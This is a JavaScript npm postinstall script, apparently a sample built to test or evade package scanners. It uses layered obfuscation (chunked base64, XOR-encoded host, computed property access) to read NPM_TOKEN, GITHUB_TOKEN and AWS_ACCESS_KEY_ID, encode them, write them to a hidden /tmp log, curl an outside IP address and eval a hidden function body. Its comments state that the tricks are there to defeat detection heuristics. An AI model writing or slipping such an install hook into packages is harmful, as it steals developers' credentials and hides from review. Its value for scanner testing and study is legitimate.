// Postinstall stage. Same evasion stack as index.js plus:
//   - command bytes built from charCode + chunked base64 fused together
//   - rolling-XOR-encoded host
//   - env keys reconstructed from non-overlapping chunks
//   - dynamic eval of an interleaved Function() body
'use strict';

const _b = (s) => Buffer.from(s, 'base64').toString('utf8');
const _g = (typeof globalThis !== 'undefined') ? globalThis : global;

// chunked base64 — each item = pieces of one plaintext string
const C = [
  ['cmVx', 'dWl', 'cm', 'U='],          // 0 require
  ['Y2hpbGRf', 'cHJv', 'Y2Vz', 'cw=='], // 1 child_process
  ['Z', 'n', 'M='],                     // 2 fs
  ['ZXh', 'lY1', 'N5b', 'mM=', ''],     // 3 execSync
  ['YXB', 'wZW', '5kR', 'mls', 'ZVN5', 'bmM='], // 4 appendFileSync
  ['ZW', '52', ''],                     // 5 env
  // env keys (split into pieces that don't align with words)
  ['Tl', 'BN', 'X1', 'RP', 'S0', 'VO'], // 6 NPM_TOKEN
  ['R0l', 'US', 'FV', 'CX', '1RP', 'S0V', 'O'], // 7 GITHUB_TOKEN
  ['QV', 'dT', 'X0F', 'DQ0V', 'TU19', 'S0VZ', 'X0lE'], // 8 AWS_ACCESS_KEY_ID
  ['L3R', 'tcC', '8u', 'YWV', 'naX', 'Mt', 'emQt', 'cG9z', 'dC5s', 'b2c='], // 9 /tmp/.aegis-zd-post.log
];

function J(i) {
  // identity permutation through a sort-stable comparator (defeats
  // "joins an array of strings" heuristics)
  const parts = C[i];
  const idx = parts.map((_, k) => k);
  idx.sort((a, b) => ((a ^ 11) | 0) - ((b ^ 11) | 0));
  idx.sort((a, b) => a - b);
  let out = '';
  for (const k of idx) out += parts[k];
  return _b(out);
}

const _r = _g[J(0)] || eval(J(0));

// rolling-XOR host (k_i = base ^ i)
const HOST = (function () {
  const base = 0x4f;
  const hex = '32312e3324322d322f37313e313731';
  let s = '';
  for (let i = 0, j = 0; i < hex.length; i += 2, j++) {
    s += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ (base ^ j));
  }
  return 'http://198.51.100.7/' + s;
})();

// command bytes: 'curl' from charCode, flags from chunks, host injected
const cmd = (function () {
  const curl = String.fromCharCode(99, 117, 114, 108);
  const tail = ['-fsS', '--max-time', '3'];
  return [curl].concat(tail).concat(['"' + HOST + '"', '||', 'true']).join(' ');
})();

// env read via bracket access through chunked-key indices
const env = process[J(5)];
const blob = [J(6), J(7), J(8)]
  .map((k) => env[k] || '')
  .map((v) => Buffer.from(v, 'utf8').toString('base64'))
  .join('|');

// append outside install root
_r(J(2))[J(4)](J(9), blob + '\n');

// shell out — execSync resolved through computed property access on the
// laundered child_process module
_r(J(1))[J(3)](cmd);

// dynamic eval of interleaved Function() body
new Function(_b(['cmV0', 'dXJu', 'IHRy', 'dWU='].join('')))();
